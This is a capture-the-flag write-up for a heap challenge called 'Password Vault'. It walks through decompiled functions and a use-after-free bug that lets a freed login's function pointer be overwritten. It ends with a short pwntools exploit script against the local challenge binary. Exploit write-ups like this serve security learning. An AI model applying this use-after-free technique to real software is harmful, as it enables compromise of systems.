# Password Vault

## Introduction

In this challenge, we are given a [binary](https://github.com/chouettevan/CTF-writeups/raw/refs/heads/main/assets/dalctf2026/vault).
when running it the binary appears to be a heap challenge.
```fish
[I] ◆ password_vault ❯❯❯ ./vault
=== FFD Password Manager ===

  1. new login
  2. delete login
  3. set password
  4. check master key
  0. quit
  >
```
Heap challenges usually give functionality to create,delete and
read/write objects.

## Reverse engineering
Decompiling the binary with `angr decompile` (angr's decompiler), it becomes clear this is effectively a heap challenge, as each
function does exactlty what one would expect:
`new_login` allocates a structure,`delete_login` frees it,
`set_password` writes to it and `check_master_key` executes a function pointer. 
```c
int new_login(void)
{
    unsigned int v3;  // eax
    void* ptr;  // [bp-0x18]
    unsigned int v1;  // [bp-0xc]

    v1 = read_int("  slot [0-7]: ");
    v3 = check_slot_taken(v1);
    if (!v3)
        return v3;
    ptr = malloc(32);
    *((void* *)ptr) = access_denied;
    printf("  username: ");
    fflush(__TMC_END__);
    fgets(ptr + 8, 12, GLIBC_2.2.5::stdin);
    *(8 + (char *)ptr + strcspn(ptr + 8, "\n")) = 0;
    printf("  password: ");
    fflush(__TMC_END__);
    fgets(ptr + 20, 12, GLIBC_2.2.5::stdin);
    *(20 + (char *)ptr + strcspn(ptr + 20, "\n")) = 0;
    (&logins)[v1] = ptr;
    return printf("  [+] login for '%s' saved in slot %d\n", ptr + 8, v1);
}

extern unsigned long long logins[4];

int delete_login(void)
{
    unsigned int v2;  // eax
    unsigned int v0;  // [bp-0xc]

    v0 = read_int("  slot [0-7]: ");
    v2 = check_slot_empty(v0);
    if (!v2)
        return v2;
    printf("  [-] deleting login for '%s'\n", logins[v0] + 8);
    return (unsigned long long)free(logins[v0]);
}

typedef struct struct_1 {
    unsigned long long field_0;
} struct_1;

typedef struct struct_0 {
    struct struct_1 *field_0;
    unsigned long long field_8;
    unsigned long long field_10;
    unsigned long long field_18;
} struct_0;

extern struct_0 logins;

unsigned long long check_master_key(void)
{
    unsigned long v2;  // rdi
    unsigned long long v3;  // rax
    unsigned long long v4;  // rdx
    unsigned int v0;  // [bp-0xc]

    v0 = read_int("  slot [0-7]: ");
    v2 = v0;
    v3 = check_slot_empty(v0);
    if (!(unsigned int)v3)
        return v3;
    v4 = v0 * 8;
    return (&logins.field_0)[v0]->field_0();
}
int set_password(void)
{
    unsigned int v0;  // [bp-0xc]

    if (pwd_buf)
    {
        free(pwd_buf);
        pwd_buf = 0;
    }
    v0 = read_int("  password buffer size: ");
    if (v0 > 0 && v0 <= 0x200)
    {
        pwd_buf = malloc(v0);
        *((long long *)&pwd_size) = v0;
        printf("  enter password: ");
        fflush(__TMC_END__);
        fread(pwd_buf, 1, *((long long *)&pwd_size), GLIBC_2.2.5::stdin);
        return puts("  [+] password stored");
    }
    return puts("  bad size");
}
```
## The Bug
It is possible to check the master key of a freed login (which
is a function pointer). All we need to do is therefore
allocate a login, free it, and use the `set_password` function
to trigger reuse of the memory ,thereby allowing us to write
to the function pointer. 

## Final exploit
```python
from pwn import *
import heap_lib
target = process("./vault")
elf = target.elf

new_login = heap_lib.heap_func(b'1',target)
delete_login = heap_lib.heap_func(b'2',target)
set_password = heap_lib.heap_func(b'3',target)
check_master = heap_lib.heap_func(b'4',target)

new_login(0,b'aaaa',b'bbbb')
delete_login(0)
set_password(32,p64(elf.symbols['read_master_key'])*4)
check_master(0)
target.interactive()
```

